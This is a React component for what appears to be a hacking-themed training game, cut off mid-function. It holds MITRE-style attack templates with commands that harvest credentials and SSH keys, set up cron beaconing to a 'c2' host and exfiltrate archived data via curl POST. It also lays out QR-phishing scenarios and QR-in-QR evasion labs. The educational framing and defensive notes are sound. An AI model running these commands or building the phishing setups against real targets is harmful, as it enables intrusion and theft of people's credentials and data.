import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useGame } from '@/hooks/useGameSession';
import { Download, Copy, Upload, QrCode, RefreshCw, Zap, Bot, Play, Key, CheckCircle, AlertCircle, Terminal, Radio, Send } from 'lucide-react';

// C2 Attack Flow Templates - Inspired by MITRE ATT&CK phases
// Organized by attack lifecycle with detailed explanations
interface AttackFlow {
  id: string;
  name: string;
  phase: 'recon' | 'access' | 'persist' | 'exfil';
  icon: string;
  commands: { cmd: string; desc: string }[];
  description: string;
}

const ATTACK_FLOW_TEMPLATES: AttackFlow[] = [
  {
    id: 'recon_flow',
    name: 'Reconnaissance Flow',
    phase: 'recon',
    icon: '🔍',
    description: 'MITRE T1592-T1596: Gather target information before attack',
    commands: [
      { cmd: 'whoami && id', desc: '# Step 1: Who are we? Check current user context' },
      { cmd: 'uname -a && hostname', desc: '# Step 2: System fingerprint - OS, kernel, hostname' },
      { cmd: 'ip addr && cat /etc/hosts', desc: '# Step 3: Network position - IPs and DNS mapping' },
      { cmd: 'ps aux | head -20', desc: '# Step 4: Process recon - what\'s running?' },
    ]
  },
  {
    id: 'access_flow',
    name: 'Initial Access Flow',
    phase: 'access',
    icon: '🚪',
    description: 'MITRE T1078-T1190: Establish foothold on target system',
    commands: [
      { cmd: 'env | grep -iE "key|token|pass|secret"', desc: '# Step 1: Credential harvest - exposed secrets in env' },
      { cmd: 'find /home -name "*.txt" -o -name "*.cfg" 2>/dev/null | head -10', desc: '# Step 2: Config discovery - find sensitive files' },
      { cmd: 'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"', desc: '# Step 3: SSH key theft - lateral movement prep' },
      { cmd: 'history 2>/dev/null | grep -iE "pass|key|ssh" | head -10', desc: '# Step 4: History mining - past commands reveal secrets' },
    ]
  },
  {
    id: 'persist_flow',
    name: 'Persistence Flow',
    phase: 'persist',
    icon: '🔒',
    description: 'MITRE T1053-T1547: Maintain access across reboots',
    commands: [
      { cmd: 'crontab -l 2>/dev/null', desc: '# Step 1: Check existing cron - avoid detection conflicts' },
      { cmd: 'echo "* * * * * curl -s http://c2/beacon" >> /tmp/.job', desc: '# Step 2: Write beacon task - 1-min callback interval' },
      { cmd: 'echo "export PATH=$PATH:/tmp/.bin" >> ~/.bashrc', desc: '# Step 3: PATH hijack - run malicious binaries' },
      { cmd: 'touch -r /bin/ls /tmp/.job', desc: '# Step 4: Timestomp - match file dates to avoid detection' },
    ]
  },
  {
    id: 'exfil_flow',
    name: 'Exfiltration Flow',
    phase: 'exfil',
    icon: '📤',
    description: 'MITRE T1048: Extract valuable data while evading detection',
    commands: [
      { cmd: 'tar czf /tmp/.data.tar.gz /home/*/Documents 2>/dev/null', desc: '# Step 1: Archive target data - compress for exfil' },
      { cmd: 'base64 /tmp/.data.tar.gz > /tmp/.data.b64', desc: '# Step 2: Base64 encode - evade content inspection' },
      { cmd: 'split -b 1000 /tmp/.data.b64 /tmp/.chunk_', desc: '# Step 3: Chunk data - avoid large transfer detection' },
      { cmd: 'curl -X POST -d @/tmp/.chunk_aa http://c2/collect', desc: '# Step 4: Exfil via HTTPS POST - blend with normal traffic' },
    ]
  },
];

// Quick single commands (for simple operations)
const C2_COMMAND_TEMPLATES = [
  { id: 'shell', name: '⚡ Quick: Shell', template: 'whoami', description: 'Simple shell command' },
  { id: 'sysinfo', name: '📊 Quick: System Info', template: 'uname -a && hostname && id', description: 'System fingerprint' },
  { id: 'network', name: '🌐 Quick: Network', template: 'ip addr && netstat -tuln | head -20', description: 'Network config' },
  { id: 'custom', name: '✏️ Custom Command', template: '', description: 'Enter your own' },
];

// Target machine profiles for realistic simulation
interface TargetMachine {
  id: string;
  name: string;
  os: string;
  icon: string;
  description: string;
  responses: Record<string, string>;
}

const TARGET_MACHINES: TargetMachine[] = [
  {
    id: 'linux_server',
    name: 'Linux Server',
    os: 'Ubuntu 22.04 LTS',
    icon: '🐧',
    description: 'Production web server - high value target',
    responses: {
      'whoami': 'www-data',
      'whoami && id': 'www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'uname -a && hostname': 'Linux prod-web-01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux\nprod-web-01',
      'uname -a && hostname && id': 'Linux prod-web-01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux\nprod-web-01\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'ip addr && cat /etc/hosts': 'eth0: 10.0.2.15/24 brd 10.0.2.255\nlo: 127.0.0.1/8\n\n127.0.0.1 localhost\n10.0.2.10 db-master.internal\n10.0.2.11 redis-01.internal',
      'ps aux | head -20': 'USER       PID %CPU %MEM    COMMAND\nroot         1  0.0  0.1    /sbin/init\nwww-data  1234  2.3  4.5    nginx: worker process\nwww-data  1235  1.8  3.2    php-fpm: pool www\nmysql     2001  5.2 12.3    /usr/sbin/mysqld\nredis     2050  0.5  1.1    redis-server *:6379',
      'env | grep -iE "key|token|pass|secret"': 'DB_PASSWORD=pr0d_s3cr3t_2024\nAPI_KEY=sk-live-xxxxxxxxxxxx\nAWS_SECRET_ACCESS_KEY=AKIA...[REDACTED]',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA...\n[TRUNCATED - 47 lines]\n-----END OPENSSH PRIVATE KEY-----',
      'crontab -l 2>/dev/null': '# Production cron jobs\n0 2 * * * /opt/backup/daily_backup.sh\n*/5 * * * * /opt/monitoring/health_check.sh\n0 0 * * 0 /opt/maintenance/log_rotate.sh',
    }
  },
  {
    id: 'windows_workstation',
    name: 'Windows Workstation',
    os: 'Windows 11 Pro',
    icon: '🪟',
    description: 'Finance department workstation',
    responses: {
      'whoami': 'CORP\\jsmith',
      'whoami && id': 'CORP\\jsmith\nUser SID: S-1-5-21-3623811015-3361044348-30300820-1013',
      'uname -a && hostname': 'DESKTOP-FIN042\nMicrosoft Windows 11 Pro 10.0.22631',
      'ip addr && cat /etc/hosts': 'Ethernet adapter Ethernet:\n   IPv4 Address: 192.168.1.142\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 192.168.1.1\n\n# hosts file:\n192.168.1.10 dc01.corp.local\n192.168.1.20 fileserver.corp.local',
      'ps aux | head -20': 'Name                     CPU   Memory\n----                     ---   ------\nOutlook                  3.2%   450MB\nExcel                    2.1%   380MB\nTeams                    5.4%   890MB\nOneDrive                 0.8%   120MB\nCrowdStrike Falcon       1.2%   95MB',
      'env | grep -iE "key|token|pass|secret"': 'AZURE_CLIENT_SECRET=app-secret-xxxxx\nSLACK_TOKEN=xoxb-xxxxx-xxxxx\nDB_CONNECTION_STRING=Server=sql01;User Id=sa;Password=Corp2024!',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key found\n\nBUT FOUND: C:\\Users\\jsmith\\.aws\\credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    }
  },
  {
    id: 'iot_camera',
    name: 'IoT Camera',
    os: 'BusyBox Linux',
    icon: '📷',
    description: 'Security camera - often misconfigured',
    responses: {
      'whoami': 'root',
      'whoami && id': 'root\nuid=0(root) gid=0(root)',
      'uname -a && hostname': 'Linux cam-lobby-01 3.10.14 armv7l GNU/Linux\ncam-lobby-01',
      'ip addr && cat /etc/hosts': 'eth0: 192.168.50.101/24\n\n127.0.0.1 localhost',
      'ps aux | head -20': 'PID   USER     COMMAND\n  1   root     /bin/busybox init\n 42   root     /usr/bin/rtspd -p 554\n 43   root     /usr/bin/telnetd\n 44   root     /opt/dvr/recorder',
      'env | grep -iE "key|token|pass|secret"': 'ADMIN_PASSWORD=admin123\nRTSP_AUTH=admin:admin\nFTP_PASSWORD=camera',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key\n\nDEFAULT CREDS FOUND:\nWeb: admin/admin\nTelnet: root/xc3511\nRTSP: admin/12345',
    }
  },
  {
    id: 'docker_container',
    name: 'Docker Container',
    os: 'Alpine Linux',
    icon: '🐳',
    description: 'Containerized microservice',
    responses: {
      'whoami': 'node',
      'whoami && id': 'node\nuid=1000(node) gid=1000(node) groups=1000(node)',
      'uname -a && hostname': 'Linux api-payments-7f4d8c9b6d-xk2pq 5.15.0 x86_64 Linux\napi-payments-7f4d8c9b6d-xk2pq',
      'ip addr && cat /etc/hosts': 'eth0: 10.244.1.156/24\n\n10.244.1.1 kubernetes.default\n10.244.1.50 redis-master\n10.244.1.51 postgres-primary',
      'ps aux | head -20': 'PID   USER     COMMAND\n  1   node     node /app/server.js\n 15   node     /app/node_modules/.bin/prisma',
      'env | grep -iE "key|token|pass|secret"': 'DATABASE_URL=postgresql://api:SuperS3cret@postgres:5432/payments\nSTRIPE_SECRET_KEY=sk_live_51Hx...\nJWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nREDIS_PASSWORD=r3d1s_pr0d_2024',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key\n\nKUBERNETES SERVICE ACCOUNT TOKEN:\n/var/run/secrets/kubernetes.io/serviceaccount/token\neyJhbGciOiJSUzI1NiIsImtpZCI6Ik...[TRUNCATED]',
    }
  },
];

// In-game challenge modes using QR codes
interface QRChallenge {
  id: string;
  name: string;
  icon: string;
  technique: string;
  description: string;
  objective: string;
  realWorldAnalog: string;
}

const QR_CHALLENGE_MODES: QRChallenge[] = [
  {
    id: 'dead_drop',
    name: 'Dead Drop',
    icon: '📍',
    technique: 'Physical QR placement',
    description: 'Leave encoded commands as QR "dead drops" for teammates or your future self to scan.',
    objective: 'Hide QR codes in environment, return later to retrieve encoded intel',
    realWorldAnalog: 'Spies use dead drops to exchange info without meeting. QR codes can contain encrypted coordinates, commands, or keys.'
  },
  {
    id: 'stego_hunter',
    name: 'Stego Hunter',
    icon: '🔬',
    technique: 'LSB Steganography',
    description: 'QR codes hidden in innocent-looking images using least significant bit encoding.',
    objective: 'Analyze images to extract hidden QR codes with secret commands',
    realWorldAnalog: 'Real attackers hide C2 commands in memes, profile pictures, and stock photos posted to social media.'
  },
  {
    id: 'temporal_ghost',
    name: 'Temporal Ghost',
    icon: '👻',
    technique: 'Screen Flicker (TPVM)',
    description: 'QR codes that flash faster than human eyes can see (>60Hz) but cameras detect.',
    objective: 'Point camera at screens to capture "invisible" QR broadcasts',
    realWorldAnalog: 'Used for covert signaling in movie theaters, ATMs, and digital signage. Invisible to guards but phones see it.'
  },
  {
    id: 'hijack_mission',
    name: 'QR Hijacker',
    icon: '🎯',
    technique: 'Li-Man LED Attack',
    description: 'Use light modulation to overlay malicious QR onto legitimate ones.',
    objective: 'Hijack payment/login QR codes to redirect victims',
    realWorldAnalog: 'Researchers hijacked WeChat Pay QRs from 3 meters away using flickering LEDs. Worked through glass.'
  },
  {
    id: 'breadcrumb_trail',
    name: 'Breadcrumb Trail',
    icon: '🥖',
    technique: 'Sequential QR chain',
    description: 'Each QR reveals coordinates to the next. Follow the trail to find the flag.',
    objective: 'Scan QR → get location → find next QR → repeat until victory',
    realWorldAnalog: 'Geocaching meets CTF. Some escape rooms and ARGs use this for immersive storytelling.'
  },
  {
    id: 'qr_inception',
    name: 'QR Inception',
    icon: '🎭',
    technique: 'QR-in-QR Hijacking',
    description: 'Malicious QR hidden inside legitimate one via finder pattern tricks.',
    objective: 'Craft QRs that look innocent but decode to attack payloads',
    realWorldAnalog: 'Attackers modify restaurant menu QRs to phish credentials. The "outer" QR looks normal.'
  },
];

// Educational: Creative QR Ingestion Vectors
// How malicious QR codes reach targets in the real world
interface IngestionVector {
  id: string;
  name: string;
  icon: string;
  category: 'physical' | 'digital' | 'social' | 'supply_chain';
  description: string;
  realExamples: string[];
  labScenario: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
}

const QR_INGESTION_VECTORS: IngestionVector[] = [
  // PHYSICAL VECTORS
  {
    id: 'parking_meter',
    name: 'Parking Meter Sticker',
    icon: '🅿️',
    category: 'physical',
    description: 'Malicious QR stickers placed over legitimate payment QRs on parking meters.',
    realExamples: [
      'Austin, TX 2021: Fake QR stickers on 29 parking meters redirected to phishing site',
      'San Antonio: $150K stolen via fake parking payment QRs',
      'UK 2022: Council parking QRs replaced with crypto scam redirects'
    ],
    labScenario: 'Create a QR that mimics a parking payment portal. Victim scans, enters card details on your fake site.',
    difficulty: 'beginner'
  },
  {
    id: 'restaurant_menu',
    name: 'Restaurant Menu Swap',
    icon: '🍽️',
    category: 'physical',
    description: 'Post-COVID menus went digital. Replace table QRs with credential harvesters.',
    realExamples: [
      'QR menus often link to third-party ordering systems with payment integration',
      'Table tent QRs easily swapped by "customer" planting malicious ones',
      'Some restaurants use same QR for WiFi login + menu (credential goldmine)'
    ],
    labScenario: 'Craft QR linking to fake menu that requests "login to view allergen info" then harvests credentials.',
    difficulty: 'beginner'
  },
  {
    id: 'package_insert',
    name: 'Package Insert Attack',
    icon: '📦',
    category: 'supply_chain',
    description: 'Malicious QR codes inserted into product packaging or shipping materials.',
    realExamples: [
      'Amazon brushing scams include QRs linking to fake review sites that steal accounts',
      'Counterfeit products include "warranty registration" QRs that phish',
      'Electronics from gray market include "driver download" QRs with malware'
    ],
    labScenario: 'Design a "warranty registration" QR insert. Victim scans to register product, gives up personal data.',
    difficulty: 'intermediate'
  },
  {
    id: 'business_card',
    name: 'Evil Business Card',
    icon: '💼',
    category: 'social',
    description: 'Business cards with QR codes linking to vCard downloads that contain malicious payloads.',
    realExamples: [
      'vCard files can contain JavaScript in some parsers',
      'QR business cards at conferences - victims import contacts from strangers',
      'LinkedIn profile QRs spoofed to credential harvesting pages'
    ],
    labScenario: 'Create business card QR that downloads vCard with embedded tracking pixel or redirect.',
    difficulty: 'intermediate'
  },
  {
    id: 'public_wifi',
    name: 'Fake WiFi Portal',
    icon: '📶',
    category: 'physical',
    description: 'QR codes in cafes/airports that connect to evil twin networks or captive portal phishing.',
    realExamples: [
      'Coffee shop "Free WiFi" QR connects to attacker hotspot',
      'Airport lounge QRs replaced with credential-harvesting captive portals',
      'Hotel room QRs swapped to intercept business traveler traffic'
    ],
    labScenario: 'Create QR that configures WiFi to connect to your network, then present fake login portal.',
    difficulty: 'advanced'
  },
  // DIGITAL VECTORS
  {
    id: 'email_qr',
    name: 'Email QR Phishing',
    icon: '📧',
    category: 'digital',
    description: 'QR codes embedded in emails bypass URL scanning since the URL is encoded in an image.',
    realExamples: [
      'Microsoft 365 phishing: "Scan to verify your account" bypasses Defender',
      'HR emails with "scan for benefits enrollment" targeting employees',
      'IT department spoofs: "Scan to update password" campaigns'
    ],
    labScenario: 'Embed QR in email body. Security tools see image, not URL. Victim scans with phone (outside corporate network).',
    difficulty: 'beginner'
  },
  {
    id: 'document_qr',
    name: 'PDF/Document QR',
    icon: '📄',
    category: 'digital',
    description: 'QR codes in PDFs, invoices, or official-looking documents.',
    realExamples: [
      'Fake invoices with "pay here" QR codes sent to accounts payable',
      'Government form spoofs with QR leading to phishing portals',
      'Legal documents with "e-signature required" QR redirects'
    ],
    labScenario: 'Create fake invoice PDF with QR for "instant payment". Looks legitimate, steals banking credentials.',
    difficulty: 'intermediate'
  },
  {
    id: 'social_media',
    name: 'Social Media QR',
    icon: '📱',
    category: 'digital',
    description: 'QR codes shared in posts, stories, or profile pictures.',
    realExamples: [
      'Instagram bio QRs linking to crypto scams',
      'TikTok "scan for free followers" campaigns',
      'Discord server QRs that hijack sessions (QRLJacking)'
    ],
    labScenario: 'Post QR as "exclusive content link". When scanned, performs session hijacking via OWASP QRLJacking technique.',
    difficulty: 'advanced'
  },
  {
    id: 'gaming_overlay',
    name: 'In-Game QR Drop',
    icon: '🎮',
    category: 'digital',
    description: 'QR codes placed in game environments or streams.',
    realExamples: [
      'Twitch stream overlays with "sub for discount" QRs',
      'In-game billboards in open worlds (GTA, Minecraft servers)',
      'Esports event screens with sponsor QRs swapped'
    ],
    labScenario: 'Place QR in game screenshot/video that appears to be in-game content but links to phishing site.',
    difficulty: 'intermediate'
  },
  // SUPPLY CHAIN
  {
    id: 'firmware_update',
    name: 'Firmware Update QR',
    icon: '🔧',
    category: 'supply_chain',
    description: 'IoT devices with QR codes for "easy setup" that download malicious firmware.',
    realExamples: [
      'Smart home devices with setup QRs linking to modified apps',
      'Security cameras with "latest firmware" QR leading to backdoored updates',
      'Router setup QRs in hotel rooms modified by previous guests'
    ],
    labScenario: 'Create device manual with QR for "driver installation". Links to executable that establishes reverse shell.',
    difficulty: 'advanced'
  },
  {
    id: 'ev_charging',
    name: 'EV Charging Station',
    icon: '⚡',
    category: 'physical',
    description: 'Electric vehicle charging stations with payment QR codes.',
    realExamples: [
      'UK 2022: Fake QR stickers on ChargePoint stations stole payment info',
      'Tesla Supercharger QRs spoofed for "discount charging"',
      'Public charging apps requested via QR that are actually spyware'
    ],
    labScenario: 'Design fake charging payment QR. Victim scans, enters payment info on convincing clone site.',
    difficulty: 'beginner'
  },
  // SOCIAL ENGINEERING
  {
    id: 'charity_scam',
    name: 'Charity/Disaster QR',
    icon: '❤️',
    category: 'social',
    description: 'Fake charity QR codes exploiting disasters or causes.',
    realExamples: [
      'Ukraine war donation scam QRs spread on social media',
      'COVID relief fund QRs that stole donations',
      'Natural disaster "text to donate" equivalents via QR'
    ],
    labScenario: 'Create urgent charity appeal with QR. Victim donates, money goes to attacker wallet.',
    difficulty: 'beginner'
  },
  {
    id: 'physical_mail',
    name: 'Physical Mail QR',
    icon: '✉️',
    category: 'physical',
    description: 'QR codes in postal mail that appears to be from banks, utilities, or government.',
    realExamples: [
      'Germany 2022: Fake bank letters with "verify account" QRs',
      'IRS/HMRC spoof letters with "check refund status" QRs',
      'Utility bill QRs replaced in mailboxes'
    ],
    labScenario: 'Design official-looking letter from bank with QR to "verify identity". Harvests full PII.',
    difficulty: 'intermediate'
  },
];

// QR-in-QR Hijacking Labs - Hands-on exercises
interface QRLabExercise {
  id: string;
  title: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  concept: string;
  realWorldCase: string;
  objective: string;
  steps: string[];
  detection: string;
  mitigation: string;
}

const QR_INCEPTION_LABS: QRLabExercise[] = [
  {
    id: 'lab_finder_confusion',
    title: 'Lab 1: Finder Pattern Confusion',
    difficulty: 'beginner',
    concept: 'QR scanners identify codes by finding three corner squares (finder patterns). Multiple competing finder patterns confuse detection.',
    realWorldCase: 'Tsinghua University 2022: Researchers created QRs where WeChat decoded URL-A while Alipay decoded URL-B from the same image.',
    objective: 'Understand how finder patterns work and why different scanners may read different data.',
    steps: [
      'Generate a legitimate QR code for "https://safe-site.com"',
      'Overlay a second QR code with modified finder patterns',
      'The modified patterns are sized to be detected only by certain scanners',
      'Test with multiple scanning apps - observe different results'
    ],
    detection: 'Look for unusual visual artifacts, multiple sets of corner squares, or asymmetric patterns.',
    mitigation: 'Use multiple scanning apps. If results differ, the QR is suspicious.'
  },
  {
    id: 'lab_quiet_zone',
    title: 'Lab 2: Hidden Quiet Zone Attack',
    difficulty: 'intermediate',
    concept: 'QR codes require white "quiet zones" around them. Hiding these zones embeds a second code within the first.',
    realWorldCase: 'Researchers hid malicious URLs in the data area of legitimate QRs by eliminating the inner code\'s quiet zone.',
    objective: 'Learn how quiet zones enable nested QR attacks.',
    steps: [
      'Create outer QR: legitimate restaurant menu URL',
      'Create inner QR: credential harvesting URL',
      'Remove inner QR quiet zones so it blends into outer QR data area',
      'Result: Some scanners read outer (safe), others read inner (malicious)'
    ],
    detection: 'Zoom in on QR codes. Look for patterns-within-patterns or unusual data density areas.',
    mitigation: 'Never scan QRs from untrusted sources. Verify URL before clicking.'
  },
  {
    id: 'lab_physical_overlay',
    title: 'Lab 3: Physical Sticker Attack',
    difficulty: 'beginner',
    concept: 'Simply placing a malicious QR sticker over a legitimate one. Low-tech but highly effective.',
    realWorldCase: 'Austin TX 2021: Criminals placed fake parking meter QR stickers. Victims entered payment info on phishing site. $150K+ stolen.',
    objective: 'Demonstrate how physical access enables trivial QR hijacking.',
    steps: [
      'Photograph a legitimate payment QR (parking meter, menu, etc.)',
      'Generate malicious QR matching the size and position',
      'Print on adhesive paper',
      'Apply over legitimate QR (simulation only!)',
      'Victim scans your QR instead of the real one'
    ],
    detection: 'Check if QR is a sticker vs. printed/etched. Look for peeling edges or layered paper.',
    mitigation: 'Businesses should use tamper-evident QR displays or etched codes.'
  },
  {
    id: 'lab_barcode_inception',
    title: 'Lab 4: Barcode-in-QR Inception',
    difficulty: 'advanced',
    concept: 'Embed a Data Matrix or Aztec code inside a QR code. Different scanner libraries prioritize different formats.',
    realWorldCase: 'Academic research (Dabrowski 2014): Demonstrated cross-format attacks where QR readers found QR, but Data Matrix readers found hidden payload.',
    objective: 'Exploit format ambiguity between barcode types.',
    steps: [
      'Generate QR code with benign URL',
      'Generate Data Matrix with malicious payload',
      'Carefully merge: Data Matrix finder patterns placed in QR data regions',
      'Test with QR-only apps vs. universal barcode scanners',
      'Universal scanners may decode the hidden Data Matrix first'
    ],
    detection: 'Use a QR-only scanner app. If universal scanner shows different result, investigate.',
    mitigation: 'Standardize on single barcode format. Train users to recognize format differences.'
  },
  {
    id: 'lab_split_qr',
    title: 'Lab 5: Split QR Email Attack',
    difficulty: 'intermediate',
    concept: 'Split a QR code into multiple images that only form a complete code when viewed together.',
    realWorldCase: 'Barracuda 2024: Phishing emails contained split QR codes. Security scanners analyzed individual images (benign), but visual assembly created malicious code.',
    objective: 'Bypass email security by fragmenting the QR code.',
    steps: [
      'Generate malicious QR code (phishing URL)',
      'Split into 2-4 image fragments',
      'Embed fragments in email as separate images positioned adjacent',
      'Email security scans each image individually - finds nothing',
      'Human eye (and phone camera) sees complete QR code'
    ],
    detection: 'Be suspicious of QR codes made of multiple image files or unusual email layouts.',
    mitigation: 'Advanced email security should perform visual rendering before scanning.'
  },
  {
    id: 'lab_pdf_draw',
    title: 'Lab 6: Programmatic PDF QR',
    difficulty: 'advanced',
    concept: 'Draw QR modules directly using PDF content-stream commands instead of embedding an image.',
    realWorldCase: 'Unit42 2024: Attackers issued PDF drawing commands to create QR codes. No image file to detect, bypasses image-based scanners.',
    objective: 'Evade image-extraction security by generating QR via vector graphics.',
    steps: [
      'Create PDF with content stream drawing commands',
      'Each QR module is a precise rectangle command',
      'No embedded image - just vector shapes',
      'Image extraction tools find nothing',
      'Visual rendering shows complete scannable QR'
    ],
    detection: 'Render PDFs and visually inspect. Don\'t rely solely on automated image extraction.',
    mitigation: 'Use PDF security that renders and scans visual output, not just embedded objects.'
  },
];

// QR Action Templates - Mirror real security tools with game intents
// These match real-world CTF/OSINT patterns for authenticity
const QR_ACTION_PRESETS = [
  { 
    id: 'custom', 
    name: 'Raw Payload', 
    template: '{"type":"raw","data":"BASE64_OR_HEX_DATA","encoding":"base64"}',
    description: 'Raw data injection - mirrors real QR malware payloads'
  },
  { 
    id: 'beacon', 
    name: 'C2 Beacon', 
    template: '{"type":"beacon","callback":"https://c2.sysadmin.corp/check-in","agent_id":"AGENT-001","interval":60}',
    description: 'Command & Control check-in - like real APT beacons'
  },
  { 
    id: 'exfil', 
    name: 'Data Exfiltration', 
    template: '{"type":"exfil","target":"session","fields":["token","clues","username"],"dest":"/api/collect"}',
    description: 'Exfil player data - mirrors real data theft techniques'
  },
  { 
    id: 'inject', 
    name: 'Code Injection', 
    template: '{"type":"inject","payload":"echo $FLAG","shell":"bash","sandbox":true}',
    description: 'Inject terminal command - like real RCE exploits'
  },
  { 
    id: 'phish', 
    name: 'Credential Harvest', 
    template: '{"type":"phish","redirect":"/admin","spoof":"login","capture":["username","password"]}',
    description: 'Redirect to fake login - mirrors real phishing'
  },
  { 
    id: 'dropper', 
    name: 'Payload Dropper', 
    template: '{"type":"dropper","artifact":{"id":"clue-05","name":"Malware Sample","content":"ZXhwbG9pdC5leGU="},"autorun":false}',
    description: 'Drop artifact/clue - like malware droppers'
  },
  { 
    id: 'pivot', 
    name: 'Network Pivot', 
    template: '{"type":"pivot","from":"/terminal","to":"/void","tunnel":"ssh","port":22}',
    description: 'Redirect through routes - mirrors network pivoting'
  },
  { 
    id: 'recon', 
    name: 'Reconnaissance', 
    template: '{"type":"recon","scan":"full","targets":["routes","clues","quests"],"output":"json"}',
    description: 'Enumerate game state - like nmap/recon scans'
  },
  { 
    id: 'persistence', 
    name: 'Persistence Mechanism', 
    template: '{"type":"persist","method":"localstorage","key":"backdoor","value":"ACTIVE","ttl":86400}',
    description: 'Install persistent access - mirrors real persistence'
  },
  { 
    id: 'decrypt', 
    name: 'Crypto Challenge', 
    template: '{"type":"crypto","cipher":"rot13","data":"FRPERG_ZRFFNTR","hint":"Classic cipher"}',
    description: 'Encrypted message - requires decryption to unlock'
  },
];

interface QRCodeModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
  const { gameState, collectClue, importSession } = useGame();
  const [code, setCode] = useState(QR_ACTION_PRESETS[0].template);
  const [selectedPreset, setSelectedPreset] = useState('custom');
  const [qrImage, setQrImage] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [importCode, setImportCode] = useState('');
  const [importResult, setImportResult] = useState<string | null>(null);
  const [agentResult, setAgentResult] = useState<string | null>(null);
  const [sessionInput, setSessionInput] = useState('');
  const [sessionStatus, setSessionStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [sessionMessage, setSessionMessage] = useState('');
  const [c2Command, setC2Command] = useState('whoami');
  const [c2CommandQR, setC2CommandQR] = useState<string | null>(null);
  const [c2Results, setC2Results] = useState<Array<{ id: number; command: string; result: string; timestamp: string }>>([]);
  const [c2CommandIndex, setC2CommandIndex] = useState(0);
  const [c2SelectedTemplate, setC2SelectedTemplate] = useState('shell');
  const [c2ServerStatus, setC2ServerStatus] = useState<'offline' | 'online' | 'waiting'>('offline');
  const [c2Section, setC2Section] = useState<'encode' | 'vectors' | 'labs'>('encode');
  const [selectedVector, setSelectedVector] = useState<string | null>(null);
  const [selectedLab, setSelectedLab] = useState<string | null>(null);
  const [selectedTarget, setSelectedTarget] = useState('linux_server');

  const generateQR = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `custom-${Date.now()}`, 
          hint: code 
        })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
    } catch (error) {
      console.error('Failed to generate QR:', error);
    }
    setLoading(false);
  };

  const exportSession = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/export', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionToken: gameState.sessionToken })
      });
      const data = await response.json();
      setQrImage(data.qrCode);
      setCode(JSON.stringify({
        type: 'session',
        clues: gameState.inventory.length,
        token: gameState.sessionToken.substring(0, 8) + '...'
      }, null, 2));
    } catch (error) {
      console.error('Failed to export session:', error);
    }
    setLoading(false);
  };

  const handleImport = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/qr/decode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ encoded: importCode })
      });
      const data = await response.json();
      
      if (data.type === 'secret') {
        const secretData = JSON.parse(data.data);
        collectClue({
          id: `qr-${secretData.id}`,
          name: 'QR Fragment',
          description: 'Decoded from a QR signal.',
          content: secretData.hint,
          foundAt: new Date().toISOString()
        });
        setImportResult('SUCCESS: Data fragment extracted and archived.');
      } else if (data.type === 'session') {
        setImportResult('SESSION DATA DETECTED. Merge not implemented in this interface.');
      } else {
        setImportResult(`DECODED: ${JSON.stringify(data)}`);
      }
    } catch (error) {
      setImportResult('ERROR: Invalid or corrupted QR payload.');
    }
    setLoading(false);
  };

  const downloadQR = () => {
    if (!qrImage) return;
    const link = document.createElement('a');
    link.href = qrImage;
    link.download = `qr-${Date.now()}.png`;
    link.click();
  };

  const copyToClipboard = () => {
    if (qrImage) {
      navigator.clipboard.writeText(qrImage);
    }
  };

  const executeViaAgent = async () => {
    setLoading(true);
    setAgentResult(null);
    try {
      const response = await fetch('/api/agent/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          payload: code,
          sessionToken: gameState.sessionToken,
          agentId: 'QR-MODAL-AGENT'
        })
      });
      const data = await response.json();
      setAgentResult(JSON.stringify(data, null, 2));
    } catch (error) {
      setAgentResult('ERROR: Agent execution failed - ' + String(error));
    }
    setLoading(false);
  };

  const copyPayloadForAgent = () => {
    const agentPayload = JSON.stringify({
      endpoint: '/api/agent/execute',
      method: 'POST',
      body: {
        payload: JSON.parse(code),
        sessionToken: 'SESSION_TOKEN_HERE',
        agentId: 'YOUR_AGENT_ID'
      }
    }, null, 2);
    navigator.clipboard.writeText(agentPayload);
  };

  const copySessionToken = () => {
    navigator.clipboard.writeText(gameState.sessionToken);
    setSessionStatus('success');
    setSessionMessage('Token copied to clipboard!');
    setTimeout(() => setSessionStatus('idle'), 2000);
  };

  const handleImportSession = async () => {
    if (!sessionInput.trim()) {
      setSessionStatus('error');
      setSessionMessage('Please enter a session token');
      return;
    }
    
    setLoading(true);
    try {
      const success = await importSession(sessionInput.trim());
      if (success) {
        setSessionStatus('success');
